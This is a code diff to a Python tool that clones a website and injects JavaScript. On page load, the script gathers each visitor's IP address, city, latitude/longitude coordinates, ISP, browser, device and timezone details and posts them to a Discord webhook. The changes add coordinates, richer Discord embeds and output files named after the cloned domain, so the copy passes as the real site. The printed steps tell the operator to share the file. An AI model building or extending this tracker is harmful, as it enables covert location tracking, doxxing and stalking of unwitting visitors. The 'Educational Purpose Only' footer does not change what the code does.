@@ -238,7 +238,8 @@ def send_to_discord():
         if details['status'] == 'success':
             message_parts.extend([
                 f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
-                f"ISP: {{details.get('isp', 'Unknown')}}"
+                f"ISP: {{details.get('isp', 'Unknown')}}",
+                f"Coordinates: {{details.get('lat', 'Unknown')}}, {{details.get('lon', 'Unknown')}}"
             ])
         
         message = "\\n".join(message_parts)
@@ -353,7 +354,8 @@ def send_to_discord():
         if details['status'] == 'success':
             message_parts.extend([
                 f"Location: {{details.get('city', 'Unknown')}}, {{details.get('country', 'Unknown')}}",
-                f"ISP: {{details.get('isp', 'Unknown')}}"
+                f"ISP: {{details.get('isp', 'Unknown')}}",
+                f"Coordinates: {{details.get('lat', 'Unknown')}}, {{details.get('lon', 'Unknown')}}"
             ])
         
         message = "\\n".join(message_parts)
@@ -414,6 +416,7 @@ def create_tracking_website(url, webhook_url):
     try:
         import requests
         from bs4 import BeautifulSoup
+        from urllib.parse import urlparse
         
         # Get the website content
         response = requests.get(url)
@@ -421,6 +424,10 @@ def create_tracking_website(url, webhook_url):
         
         # Parse the HTML
         soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Get the domain name from URL
+        parsed_url = urlparse(url)
+        domain_name = parsed_url.netloc.replace('www.', '')
         
         # Add tracking script with enhanced information gathering
         tracking_script = f"""
@@ -485,56 +492,72 @@ async function trackIP() {{
         // Get detailed system information
         const systemInfo = await getDetailedInfo();
         
-        // Create a professional Discord message
-        const embed = {{
-            title: "🔍 New Website Visit Detected",
-            color: 0x00ff00,
-            fields: [
-                {{
-                    name: "🌐 IP Information",
-                    value: `Public IP: \`${{publicIP}}\`\\n` +
-                           `Location: \`${{details.city || 'Unknown'}}, ${{details.country || 'Unknown'}}\`\\n` +
-                           `ISP: \`${{details.isp || 'Unknown'}}\`\\n` +
-                           `Timezone: \`${{details.timezone || 'Unknown'}}\`\\n` +
-                           `AS: \`${{details.as || 'Unknown'}}\``,
-                    inline: false
+        // Create a professional Discord message with embeds
+        const embeds = [
+            {{
+                title: "🔍 New Website Visit Detected",
+                description: "Detailed information about the visitor",
+                color: 0x2b2d31,
+                thumbnail: {{
+                    url: "https://i.imgur.com/8j3qX5N.png"
                 }},
-                {{
-                    name: "💻 System Information",
-                    value: `Browser: \`${{systemInfo.browser.name}} ${{systemInfo.browser.version}}\`\\n` +
-                           `Platform: \`${{systemInfo.browser.platform}}\`\\n` +
-                           `Language: \`${{systemInfo.browser.language}}\`\\n` +
-                           `Screen: \`${{systemInfo.screen.width}}x${{systemInfo.screen.height}}\`\\n` +
-                           `Cores: \`${{systemInfo.device.hardwareConcurrency}}\`\\n` +
-                           `Memory: \`${{systemInfo.device.deviceMemory}}GB\``,
-                    inline: false
-                }},
-                {{
-                    name: "📱 Device Details",
-                    value: `User Agent: \`${{systemInfo.browser.userAgent}}\`\\n` +
-                           `Touch Points: \`${{systemInfo.device.maxTouchPoints}}\`\\n` +
-                           `Connection: \`${{systemInfo.device.connection.type || 'Unknown'}}\`\\n` +
-                           `Speed: \`${{systemInfo.device.connection.downlink || 'Unknown'}} Mbps\``,
-                    inline: false
-                }},
-                {{
-                    name: "⏰ Time Information",
-                    value: `Timezone: \`${{systemInfo.time.timezone}}\`\\n` +
-                           `Local Time: \`${{systemInfo.time.localTime}}\``,
-                    inline: false
+                fields: [
+                    {{
+                        name: "🌐 IP & Location Information",
+                        value: `\\`\\`\\`\\n` +
+                               `IP Address: ${{publicIP}}\\n` +
+                               `Location: ${{details.city || 'Unknown'}}, ${{details.country || 'Unknown'}}\\n` +
+                               `Coordinates: ${{details.lat || 'Unknown'}}, ${{details.lon || 'Unknown'}}\\n` +
+                               `ISP: ${{details.isp || 'Unknown'}}\\n` +
+                               `AS: ${{details.as || 'Unknown'}}\\n` +
+                               `Timezone: ${{details.timezone || 'Unknown'}}\\n` +
+                               `\\`\\`\\``,
+                        inline: false
+                    }},
+                    {{
+                        name: "💻 System Information",
+                        value: `\\`\\`\\`\\n` +
+                               `Browser: ${{systemInfo.browser.name}} ${{systemInfo.browser.version}}\\n` +
+                               `Platform: ${{systemInfo.browser.platform}}\\n` +
+                               `Language: ${{systemInfo.browser.language}}\\n` +
+                               `Screen: ${{systemInfo.screen.width}}x${{systemInfo.screen.height}}\\n` +
+                               `Cores: ${{systemInfo.device.hardwareConcurrency}}\\n` +
+                               `Memory: ${{systemInfo.device.deviceMemory}}GB\\n` +
+                               `\\`\\`\\``,
+                        inline: false
+                    }},
+                    {{
+                        name: "📱 Device Details",
+                        value: `\\`\\`\\`\\n` +
+                               `User Agent: ${{systemInfo.browser.userAgent}}\\n` +
+                               `Touch Points: ${{systemInfo.device.maxTouchPoints}}\\n` +
+                               `Connection: ${{systemInfo.device.connection.type || 'Unknown'}}\\n` +
+                               `Speed: ${{systemInfo.device.connection.downlink || 'Unknown'}} Mbps\\n` +
+                               `\\`\\`\\``,
+                        inline: false
+                    }},
+                    {{
+                        name: "⏰ Time Information",
+                        value: `\\`\\`\\`\\n` +
+                               `Timezone: ${{systemInfo.time.timezone}}\\n` +
+                               `Local Time: ${{systemInfo.time.localTime}}\\n` +
+                               `\\`\\`\\``,
+                        inline: false
+                    }}
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {{
+                    text: "IP Tracker Tool • Educational Purpose Only",
+                    icon_url: "https://i.imgur.com/8j3qX5N.png"
                 }}
-            ],
-            timestamp: new Date().toISOString(),
-            footer: {{
-                text: "IP Tracker Tool - Educational Purpose Only"
             }}
-        }};
+        ];
         
         // Send to Discord
         await fetch('{webhook_url}', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify({{ embeds: [embed] }})
+            body: JSON.stringify({{ embeds }})
         }});
     }} catch (error) {{
         console.error('Tracking error:', error);
@@ -548,19 +571,19 @@ window.addEventListener('load', trackIP);
         # Add the tracking script to the HTML
         soup.body.append(BeautifulSoup(tracking_script, 'html.parser'))
         
-        # Save the modified website
-        output_file = "tracking_website.html"
+        # Save the modified website with the domain name
+        output_file = f"{domain_name}.html"
         with open(output_file, 'w', encoding='utf-8') as f:
             f.write(str(soup))
         
         console.print(f"[green]Successfully created tracking website![/green]")
         console.print("\n[bold yellow]Important:[/bold yellow]")
-        console.print("1. Share the [bold]tracking_website.html[/bold] file")
-        console.print("2. When someone visits this website, you'll receive detailed information including:")
-        console.print("   - IP address and location")
-        console.print("   - Browser and system details")
-        console.print("   - Device information")
-        console.print("   - Time and timezone")
+        console.print(f"1. Share the [bold]{output_file}[/bold] file")
+        console.print("2. When someone visits this website, you'll receive a professional Discord message with:")
+        console.print("   - IP address and location details (including coordinates)")
+        console.print("   - System and browser information")
+        console.print("   - Device specifications")
+        console.print("   - Time and timezone data")
         show_file_location(output_file)
         return output_file
     except Exception as e:
